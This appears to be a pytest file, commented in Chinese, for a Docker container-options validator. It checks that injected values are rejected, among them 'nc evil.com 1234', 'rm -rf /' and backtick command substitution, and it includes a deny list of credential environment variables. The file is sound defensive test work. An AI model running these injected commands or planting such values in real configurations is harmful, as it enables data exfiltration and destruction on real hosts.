"""P0.18.3 加固 — docker_provider.py 容器配置参数注入 / env / labels / network / security_opts 单元测试。

覆盖 9 个加固点：
1. image 非法字符 / NUL / 控制字符 / 长度 / 空白 / 拼接恶意字符串
2. env 敏感变量拦截（LD_PRELOAD / PATH / *_TOKEN / AWS_* / KUBECONFIG 等）
3. env 值含 NUL / 控制字符 / 非 str
4. labels 字符集 / 长度 / NUL / 数量 / 注入冒号
5. network_mode 白名单（拒绝任意字符串）
6. cmd 元素 NUL / 长度限制 / 非 str
7. security_opts shell metacharacter（防止单参数注入多选项）
8. mounts.mode 白名单（必须 ro / rw）
9. ports / resource_limits 范围校验
"""
from __future__ import annotations

import pytest

from orchestrator.docker_provider import (
    ContainerCreateOptions,
    ContainerSecurityError,
    _validate_image,
    _validate_env,
    _validate_labels,
    _validate_network_mode,
    _validate_cmd,
    _validate_security_opts,
    _validate_mounts,
    _validate_ports,
    _validate_resource_limits,
    _build_volumes,
)


# ============================================================
# 加固点 1：image 校验
# ============================================================

class TestImageValidation:
    """image 拒绝 NUL / 控制字符 / 长度 / 空白 / 拼接恶意字符串。"""

    def test_valid_image(self):
        _validate_image("alpine:3.18")
        _validate_image("my.registry.com/path/image:tag")
        _validate_image("image@sha256:abcdef0123456789")

    def test_empty_rejected(self):
        with pytest.raises(ContainerSecurityError, match="non-empty"):
            _validate_image("")

    def test_none_rejected(self):
        with pytest.raises(ContainerSecurityError):
            _validate_image(None)

    def test_non_str_rejected(self):
        with pytest.raises(ContainerSecurityError):
            _validate_image(123)

    def test_nul_byte_rejected(self):
        with pytest.raises(ContainerSecurityError, match="control characters"):
            _validate_image("alpine\x00:latest")

    def test_newline_rejected(self):
        with pytest.raises(ContainerSecurityError, match="control characters"):
            _validate_image("alpine:latest\n")

    def test_too_long_rejected(self):
        with pytest.raises(ContainerSecurityError, match="too long"):
            _validate_image("a" * 300 + ":latest")

    def test_whitespace_rejected(self):
        """image 名含空格应拒绝。"""
        with pytest.raises(ContainerSecurityError, match="invalid characters"):
            _validate_image("alpine latest")

    def test_tab_rejected(self):
        """tab 是控制字符（ASCII 9），走 _has_control_chars 路径。"""
        with pytest.raises(ContainerSecurityError, match="control characters"):
            _validate_image("alpine\t:latest")

    def test_shell_metachar_rejected(self):
        """image 名含 `;` `&` `|` `\` 等 shell 元字符应拒绝。"""
        for bad in ("alpine;rm", "alpine&rm", "alpine|rm", "alpine$VAR", "alpine`id`"):
            with pytest.raises(ContainerSecurityError, match="invalid characters"):
                _validate_image(bad)

    def test_privileged_string_rejected(self):
        """image 名含 `--privileged`（docker run 选项字符串）应拒绝。"""
        with pytest.raises(ContainerSecurityError, match="invalid characters"):
            _validate_image("alpine --privileged")


# ============================================================
# 加固点 2-3：env 校验（敏感黑名单 + NUL + 类型）
# ============================================================

class TestEnvValidation:
    """env 拒绝敏感变量 / NUL / 非 str / 数量超限。"""

    def test_valid_env(self):
        _validate_env({"MY_VAR": "value", "DEBUG": "1"})

    def test_empty_env_ok(self):
        _validate_env({})

    @pytest.mark.parametrize("denied_key", [
        "LD_PRELOAD", "ld_preload",           # 大小写不敏感
        "LD_LIBRARY_PATH",
        "PATH",
        "HOME",
        "HTTP_PROXY", "HTTPS_PROXY", "http_proxy",
        "DB_SECRET",                           # *_SECRET
        "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY",
        "AZURE_CLIENT_SECRET",
        "GOOGLE_APPLICATION_CREDENTIALS",
        "KUBECONFIG",
    ])
    def test_denied_env_keys_rejected(self, denied_key):
        with pytest.raises(ContainerSecurityError, match="forbidden"):
            _validate_env({denied_key: "value"})

    @pytest.mark.parametrize("denied_token", [
        "GITHUB_TOKEN",
        "OPENAI_API_TOKEN",
        "ANTHROPIC_API_TOKEN",
        "HF_API_TOKEN",
        "DOCKER_AUTH_TOKEN",
    ])
    def test_denied_token_keys_rejected(self, denied_token):
        """特定 _TOKEN 黑名单（已拆分，避免误拦 AGENTOPS_WORKER_TOKEN）。"""
        with pytest.raises(ContainerSecurityError, match="forbidden"):
            _validate_env({denied_token: "value"})

    def test_agentops_worker_token_allowed(self):
        """AGENTOPS_WORKER_TOKEN 是合法的运行时凭证，allowlist 豁免。"""
        _validate_env({"AGENTOPS_WORKER_TOKEN": "placeholder-token"})

    def test_agentops_manager_ws_url_allowed(self):
        _validate_env({"AGENTOPS_MANAGER_WS_URL": "ws://host:1987/ws/projects/default/workers/abc"})

    def test_generic_api_token_still_rejected(self):
        """未白名单的 API_TOKEN 应被拒。"""
        with pytest.raises(ContainerSecurityError, match="forbidden"):
            _validate_env({"API_TOKEN": "value"})

    def test_agentops_prefix_with_unlisted_var_rejected(self):
        """AGENTOPS_* 前缀但不在 allowlist 的变量仍走黑名单（_KEY 等）。"""
        with pytest.raises(ContainerSecurityError, match="forbidden"):
            _validate_env({"AGENTOPS_USER_KEY": "value"})

    def test_env_value_with_nul_rejected(self):
        with pytest.raises(ContainerSecurityError, match="control characters"):
            _validate_env({"OK_VAR": "value\x00evil"})

    def test_env_value_with_newline_rejected(self):
        with pytest.raises(ContainerSecurityError, match="control characters"):
            _validate_env({"OK_VAR": "value\nrm -rf /"})

    def test_env_value_non_str_rejected(self):
        with pytest.raises(ContainerSecurityError):
            _validate_env({"OK_VAR": 123})

    def test_env_key_empty_rejected(self):
        with pytest.raises(ContainerSecurityError):
            _validate_env({"": "value"})

    def test_env_too_many_rejected(self):
        # MAX_ENV_COUNT = 256
        env = {f"VAR_{i}": "x" for i in range(257)}
        with pytest.raises(ContainerSecurityError, match="too many"):
            _validate_env(env)


# ============================================================
# 加固点 4：labels 校验（字符集 / 长度 / NUL / 数量）
# ============================================================

class TestLabelsValidation:
    """labels 拒绝非法字符 / 长度 / NUL / 数量超限。"""

    def test_valid_labels(self):
        _validate_labels({"app": "test", "agentops.run_id": "abc-123"})

    def test_empty_labels_ok(self):
        _validate_labels({})

    def test_label_key_too_long_rejected(self):
        with pytest.raises(ContainerSecurityError, match="label key too long"):
            _validate_labels({"k" * 64: "v"})

    def test_label_value_too_long_rejected(self):
        with pytest.raises(ContainerSecurityError, match="value too long"):
            _validate_labels({"k": "v" * 64})

    def test_label_nul_rejected(self):
        with pytest.raises(ContainerSecurityError, match="control characters"):
            _validate_labels({"app\x00": "test"})

    def test_label_invalid_chars_rejected(self):
        """含 `=` `;` `&` 等字符应拒绝（label value 允许 `: +` 用于 timestamp）。"""
        for bad in ("app=evil", "app;evil", "app&rm", "app|pipe"):
            with pytest.raises(ContainerSecurityError, match="invalid characters"):
                _validate_labels({bad: "v"})

    def test_label_value_with_iso_timestamp_ok(self):
        """ISO timestamp（如 2026-08-11T17:26:54+00:00）应允许。"""
        _validate_labels({"agentops.built_at": "2026-08-11T17:26:54+00:00"})

    def test_label_non_str_value_rejected(self):
        with pytest.raises(ContainerSecurityError):
            _validate_labels({"app": 123})

    def test_label_too_many_rejected(self):
        labels = {f"k{i}": "v" for i in range(65)}
        with pytest.raises(ContainerSecurityError, match="too many"):
            _validate_labels(labels)


# ============================================================
# 加固点 5：network_mode 白名单
# ============================================================

class TestNetworkModeValidation:
    """network_mode 白名单（bridge / none / host / container:<id>）。"""

    @pytest.mark.parametrize("mode", ["bridge", "none", "host"])
    def test_allowed_modes(self, mode):
        _validate_network_mode(mode)

    def test_container_id_format_ok(self):
        _validate_network_mode("container:abc123def456")

    def test_arbitrary_string_rejected(self):
        with pytest.raises(ContainerSecurityError, match="not in allow-list"):
            _validate_network_mode("custom-network")

    def test_arbitrary_with_id_rejected(self):
        with pytest.raises(ContainerSecurityError, match="not in allow-list"):
            _validate_network_mode("bridge:extra")

    def test_empty_rejected(self):
        with pytest.raises(ContainerSecurityError):
            _validate_network_mode("")

    def test_non_str_rejected(self):
        with pytest.raises(ContainerSecurityError):
            _validate_network_mode(None)

    def test_container_id_invalid_chars_rejected(self):
        """container:<id> 的 id 必须合法字符集。"""
        with pytest.raises(ContainerSecurityError, match="valid container id"):
            _validate_network_mode("container:abc;DROP-TABLE")


# ============================================================
# 加固点 6：cmd 校验（NUL / 长度 / 类型）
# ============================================================

class TestCmdValidation:
    """cmd 拒绝 NUL / 长度超限 / 非 str。"""

    def test_valid_cmd(self):
        _validate_cmd(["sleep", "3600"])

    def test_empty_cmd_ok(self):
        _validate_cmd([])

    def test_cmd_nul_rejected(self):
        with pytest.raises(ContainerSecurityError, match="control characters"):
            _validate_cmd(["sleep\x00evil"])

    def test_cmd_newline_rejected(self):
        with pytest.raises(ContainerSecurityError, match="control characters"):
            _validate_cmd(["sleep\n3600"])

    def test_cmd_too_long_rejected(self):
        with pytest.raises(ContainerSecurityError, match="too long"):
            _validate_cmd(["x" * (131072 + 1)])

    def test_cmd_non_str_rejected(self):
        with pytest.raises(ContainerSecurityError):
            _validate_cmd(["sleep", 3600])

    def test_cmd_not_list_rejected(self):
        with pytest.raises(ContainerSecurityError):
            _validate_cmd("sleep 3600")  # type: ignore[arg-type]


# ============================================================
# 加固点 7：security_opts shell metacharacter 拦截
# ============================================================

class TestSecurityOptsValidation:
    """security_opts 拒绝 shell metacharacter（防单参数注入多选项）。"""

    def test_valid_security_opts(self):
        _validate_security_opts(["no-new-privileges:true"])
        _validate_security_opts(["seccomp=unconfined"])

    def test_empty_list_ok(self):
        _validate_security_opts([])

    @pytest.mark.parametrize("bad_opt", [
        "no-new-privileges:true; rm -rf /",
        "no-new-privileges:true && id",
        "seccomp=unconfined | nc evil.com 1234",
        "opt1\nopt2",
    ])
    def test_shell_metachar_rejected(self, bad_opt):
        with pytest.raises(ContainerSecurityError, match="shell metacharacters"):
            _validate_security_opts([bad_opt])

    def test_empty_string_rejected(self):
        with pytest.raises(ContainerSecurityError):
            _validate_security_opts([""])

    def test_non_str_rejected(self):
        with pytest.raises(ContainerSecurityError):
            _validate_security_opts([123])


# ============================================================
# 加固点 8：mounts.mode 白名单
# ============================================================

class TestMountsValidation:
    """mounts.mode 必须是 ro / rw。"""

    def test_valid_mounts(self):
        _validate_mounts([
            {"host": "/host", "container": "/workspace", "mode": "rw"},
            {"host": "/host", "container": "/read", "mode": "ro"},
        ])

    def test_invalid_mode_rejected(self):
        with pytest.raises(ContainerSecurityError, match="must be 'ro' or 'rw'"):
            _validate_mounts([{"host": "/h", "container": "/c", "mode": "rwx"}])

    def test_mount_host_with_nul_rejected(self):
        with pytest.raises(ContainerSecurityError, match="control characters"):
            _validate_mounts([{"host": "/h\x00", "container": "/c", "mode": "rw"}])

    def test_mount_container_with_nul_rejected(self):
        with pytest.raises(ContainerSecurityError, match="control characters"):
            _validate_mounts([{"host": "/h", "container": "/c\x00", "mode": "rw"}])

    def test_mount_missing_host_rejected(self):
        with pytest.raises(ContainerSecurityError, match="host"):
            _validate_mounts([{"container": "/c", "mode": "rw"}])


# ============================================================
# 加固点 9：ports / resource_limits 范围
# ============================================================

class TestPortsValidation:
    """ports 范围 + 数量。"""

    def test_valid_ports(self):
        _validate_ports([{"container_port": 80, "host_port": 8080, "protocol": "tcp"}])

    def test_port_zero_random_ok(self):
        """host_port=0 表示由 docker 自动分配。"""
        _validate_ports([{"container_port": 7891, "host_port": 0}])

    def test_port_out_of_range_rejected(self):
        with pytest.raises(ContainerSecurityError, match="container_port"):
            _validate_ports([{"container_port": 70000}])

    def test_port_negative_rejected(self):
        with pytest.raises(ContainerSecurityError, match="container_port"):
            _validate_ports([{"container_port": -1}])

    def test_invalid_protocol_rejected(self):
        with pytest.raises(ContainerSecurityError, match="protocol"):
            _validate_ports([{"container_port": 80, "protocol": "ftp"}])

    def test_too_many_ports_rejected(self):
        ports = [{"container_port": i} for i in range(33)]
        with pytest.raises(ContainerSecurityError, match="too many"):
            _validate_ports(ports)


class TestResourceLimitsValidation:
    """pids / memory_bytes / nano_cpus 范围校验。"""

    def test_valid_limits(self):
        _validate_resource_limits({"pids": 256, "memory_bytes": 2 * 1024**3, "nano_cpus": 2 * 10**9})

    def test_pids_too_high_rejected(self):
        with pytest.raises(ContainerSecurityError, match="pids"):
            _validate_resource_limits({"pids": 65536})

    def test_memory_too_small_rejected(self):
        with pytest.raises(ContainerSecurityError, match="memory_bytes"):
            _validate_resource_limits({"memory_bytes": 1024})

    def test_memory_too_large_rejected(self):
        with pytest.raises(ContainerSecurityError, match="memory_bytes"):
            _validate_resource_limits({"memory_bytes": 1024**4})

    def test_cpu_too_low_rejected(self):
        with pytest.raises(ContainerSecurityError, match="nano_cpus"):
            _validate_resource_limits({"nano_cpus": 1})


# ============================================================
# ContainerCreateOptions.__post_init__ 集成校验
# ============================================================

class TestContainerCreateOptionsValidation:
    """构造 ContainerCreateOptions 时跑全字段校验。"""

    def test_minimal_options_ok(self):
        opts = ContainerCreateOptions(image="alpine:3.18")
        assert opts.image == "alpine:3.18"

    def test_invalid_image_raises(self):
        with pytest.raises(ContainerSecurityError):
            ContainerCreateOptions(image="alpine\x00:latest")

    def test_invalid_env_raises(self):
        with pytest.raises(ContainerSecurityError, match="forbidden"):
            ContainerCreateOptions(
                image="alpine:3.18",
                env={"PATH": "/evil"},
            )

    def test_invalid_label_raises(self):
        with pytest.raises(ContainerSecurityError):
            ContainerCreateOptions(
                image="alpine:3.18",
                labels={"app=evil": "x"},
            )

    def test_invalid_network_raises(self):
        with pytest.raises(ContainerSecurityError, match="not in allow-list"):
            ContainerCreateOptions(
                image="alpine:3.18",
                network_mode="custom-net",
            )

    def test_invalid_cmd_raises(self):
        with pytest.raises(ContainerSecurityError, match="control characters"):
            ContainerCreateOptions(
                image="alpine:3.18",
                cmd=["sleep\x00evil"],
            )

    def test_invalid_security_opt_raises(self):
        with pytest.raises(ContainerSecurityError, match="shell metacharacters"):
            ContainerCreateOptions(
                image="alpine:3.18",
                security_opts=["no-new-privileges:true;rm"],
            )

    def test_invalid_mount_mode_raises(self):
        with pytest.raises(ContainerSecurityError, match="must be 'ro' or 'rw'"):
            ContainerCreateOptions(
                image="alpine:3.18",
                mounts=[{"host": "/h", "container": "/c", "mode": "exec"}],
            )

    def test_valid_container_id_network_ok(self):
        opts = ContainerCreateOptions(
            image="alpine:3.18",
            network_mode="container:abc123def456",
        )
        assert opts.network_mode == "container:abc123def456"

    def test_host_network_logs_warning(self, caplog):
        """network_mode=host 是合法但有 warning。"""
        import logging
        with caplog.at_level(logging.WARNING, logger="orchestrator.docker_provider"):
            ContainerCreateOptions(image="alpine:3.18", network_mode="host")
        assert "network_mode='host'" in caplog.text


# ============================================================
# _build_volumes Windows 路径
# ============================================================

class TestBuildVolumesWindowsPath:
    """_build_volumes 用 list 格式（target/source/type/read_only）避免 `:` 拼接歧义。"""

    def test_windows_path_in_host(self):
        """Windows 路径 `C:\\path` 含 `:` — 新格式无歧义。"""
        mounts = [{"host": "C:/Users/Alice/project", "container": "/workspace", "mode": "rw"}]
        result = _build_volumes(mounts)
        assert result[0]["source"] == "C:/Users/Alice/project"
        assert result[0]["target"] == "/workspace"
        # 不会再拼接 `C:/Users/Alice/project:/workspace` 这种错误字符串

    def test_windows_path_ro(self):
        mounts = [{"host": "C:/Users/Alice", "container": "/data", "mode": "ro"}]
        result = _build_volumes(mounts)
        assert result[0]["read_only"] is True